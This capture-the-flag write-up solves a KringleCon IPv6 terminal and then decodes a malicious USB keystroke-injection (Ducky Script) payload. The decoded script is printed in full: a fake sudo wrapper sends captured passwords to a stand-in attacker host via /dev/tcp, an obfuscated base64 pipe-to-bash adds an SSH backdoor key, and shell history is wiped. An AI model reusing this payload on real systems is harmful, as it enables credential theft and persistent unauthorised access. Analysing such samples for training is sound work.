# Challenge 5: Strange USB Device

> Assist the elves in reverse engineering the strange USB device. Visit Santa's Talks Floor and hit up Jewel Loggins for advice.

## The Hint

Speaking with Jewel, we get the following:

> Well hello! I'm Jewel Loggins.
>
> I have to say though, I'm a bit distressed.
>
> The con next door? Oh sure, I’m concerned about that too, but I was talking about the issues I’m having with IPv6.
>
> I mean, I know it's an old protocol now, but I've just never checked it out.
>
> So now I'm trying to do simple things like Nmap and cURL using IPv6, and I can't quite get them working!
>
> Would you mind taking a look for me on this terminal?
>
> I think there's a Github Gist that covers tool usage with IPv6 targets.
>
> The tricky parts are knowing when to use [] around IPv6 addresses and where to specify the source interface.
>
> I’ve got a deal for you. If you show me how to solve this terminal, I’ll provide you with some nice tips about a topic I’ve been researching a lot lately – Ducky Scripts! They can be really interesting and fun!

Jumping into the terminal, we get the following prompt:

```bash
Tools:

* netcat
* nmap
* ping / ping6
* curl

Welcome, Kringlecon attendee! The candy striper is running as a service on                    
this terminal, but I can't remember the password. Like a sticky note under the                
keyboard, I put the password on another machine in this network. Problem is: I                
don't have the IP address of that other host.

Please do what you can to help me out. Find the other machine, retrieve the                   
password, and enter it into the Candy Striper in the pane above. I know you                   
can get it running again!
```

Let's check to see what our ipv6 address is, and then send a multicast ping to see what other systems are on our
network:

```bash
elf@245aa314480f:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000   
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                     
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
1196: eth0@if1197: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:c0:a8:a0:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0                         
    inet 192.168.160.3/20 brd 192.168.175.255 scope global eth0                               
       valid_lft forever preferred_lft forever
    inet6 2604:6000:1528:cd:d55a:f8a7:d30a:2/112 scope global nodad                           
       valid_lft forever preferred_lft forever
    inet6 fe80::42:c0ff:fea8:a003/64 scope link                                               
       valid_lft forever preferred_lft forever
elf@245aa314480f:~$ ping6 ff02::1 -c2
PING ff02::1(ff02::1) 56 data bytes
64 bytes from fe80::42:c0ff:fea8:a003%eth0: icmp_seq=1 ttl=64 time=0.035 ms                   
64 bytes from fe80::42:ebff:fe17:d854%eth0: icmp_seq=1 ttl=64 time=0.112 ms (DUP!)            
64 bytes from fe80::42:c0ff:fea8:a002%eth0: icmp_seq=1 ttl=64 time=0.124 ms (DUP!)            
64 bytes from fe80::42:c0ff:fea8:a003%eth0: icmp_seq=2 ttl=64 time=0.037 ms                   

--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +2 duplicates, 0% packet loss, time 6ms                    
rtt min/avg/max/mdev = 0.035/0.077/0.124/0.041 ms
```

We can see that we are `fe80::42:c0ff:fea8:a003`, so we can rule those entries out as targets. We can see another IP
that's close to ours: `fe80::42:c0ff:fea8:a002%eth0` which makes it a good target. Let's run an `nmap` scan:

```bash
elf@245aa314480f:~$ nmap -6 fe80::42:c0ff:fea8:a002%eth0
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-21 17:09 UTC
Nmap scan report for fe80::42:c0ff:fea8:a002
Host is up (0.000088s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
9000/tcp open  cslistener

Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
```

We can see that port 80 is open - let's curl it and see what we get back:

```bash
elf@245aa314480f:~$ curl http://[fe80::42:c0ff:fea8:a002] --interface eth0
<html>
<head><title>Candy Striper v6</title></head>
<body>
<marquee>Connect to the other open TCP port to get the striper's activation phrase!</marquee>
</body>
</html>
```

We can connect to the other port with `nc` to retrieve the passphrase:

```bash
elf@245aa314480f:~$ nc -6 fe80::42:c0ff:fea8:a002%eth0 9000
PieceOnEarth
```

Once complete, here's what Jewel has to say:

> Great work! It seems simpler now that I've seen it once. Thanks for showing me!
>
> Prof. Petabyte warned us about random USB devices. They might be malicious keystroke injectors!
>
> A troll could program a keystroke injector to deliver malicious keystrokes when it is plugged in.
>
> Ducky Script is a language used to specify those keystrokes.
>
> What commands would a troll try to run on our workstations?
>
> I heard that SSH keys can be used as backdoors. Maybe that's useful?

## The Main Challenge

The USB device in question can be found by heading throug the doorway at the far left of the Santa Talks floor.
Accessing the terminal gives the following prompt:

```bash
A random USB device, oh what could be the matter?
It seems a troll has left this, right on a silver platter.
Oh my friend I need your ken, this does not smell of attar.
Help solve this challenge quick quick, I shall offer no more natter.

Evaluate the USB data in /mnt/USBDEVICE.


elf@8cf4fe6a23da:~$
```

Listing the contents of our directory, we see we have access to `mallard.py` which seems to be a script to help with
evaluating duckscript binaries:

```bash
elf@d1717fa474ab:~$ ls -l
total 12
-rwxr-xr-x 1 root root 8802 Nov 30 22:14 mallard.py*
elf@d1717fa474ab:~$ ./mallard.py 
usage: mallard.py [-h] [--file FILE] [--no_analyze] [--output_file OUTPUT_FILE]
                  [--analysis_file ANALYSIS_FILE] [--debug]

optional arguments:
  -h, --help            show this help message and exit
  --file FILE, -f FILE  The file to decode, default: inject.bin
  --no_analyze, -A      Include this switch to turn off analysis of the duckyfile
  --output_file OUTPUT_FILE, -o OUTPUT_FILE
                        File to save decoded ducky script to. Default will print duckyfile to
                        screen.
  --analysis_file ANALYSIS_FILE
                        Location to output analysis. Default will print analysis to screen.
  --debug               Enable Debug Logging.
 
```

Let's run it against the `USBDEVICE`:

```bash
elf@d1717fa474ab:~$ ./mallard.py -f /mnt/USBDEVICE/inject.bin -o out                           
ENTER                                                                                          
DELAY 1000                                                                                     
GUI SPACE                                                                                      
DELAY 500                                                                                      
STRING terminal                                                                                
ENTER                                                                                          
DELAY 500                                                                                      
GUI -                                                                                          
GUI -                                                                                          
GUI -                                                                                          
GUI -                                                                                          
GUI -                                                                                          
STRING  /bin/bash
ENTER
DELAY 500
STRING mkdir -p ~/.config/sudo
ENTER
DELAY 200
STRING echo '#!/bin/bash > ~/.config/sudo/sudo
ENTER
STRING /usr/bin/sudo $@ 
ENTER
STRING echo -n "[sudo] password for $USER: "
ENTER
STRING read -s pwd
ENTER
STRING echo                                                                                    
ENTER                                                                                          
STRING echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null                                         
ENTER                                                                                          
STRING if [ $? -eq 1 ]                                                                         
ENTER                                                                                          
STRING then
ENTER
STRING echo "$USER:$pwd:invalid" > /dev/tcp/trollfun.jackfrosttower.com/1337
ENTER
STRING echo "Sorry, try again."
ENTER
STRING sudo $@
ENTER
STRING else
ENTER
STRING echo "$USER:$pwd:valid" > /dev/tcp/trollfun.jackfrosttower.com/1337
ENTER
STRING echo "$pwd" | /usr/bin/sudo -S $@
ENTER
STRING fi
ENTER
STRING fi' > ~/.config/sudo/sudo
ENTER
DELAY 200
STRING echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d | bash
ENTER
DELAY 600
STRING history -c && rm .bash_history && exit
ENTER
DELAY 600
GUI q
```

We get what appears to be the original Ducky Script. The script seems to be generating a fake sudo prompt, capturing the
target users' sudo credentials, and sending them to a malicious site. Towards to bottom, we see what looks like a
reversed base64 encoded string that gets piped to `rev`, then `base64 -d` to decode, and finally `bash` to execute. We
can run this command in a bash terminal, minus the pipe to `bash`, to retrieve its contents:

```
$ echo ==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ | rev | base64 -d
echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys
```

The device adds a malicious ssh key to the authorized keys list for backdoor access to the victims system. This key
includes the answer to the challenge `ickymcgoop`. 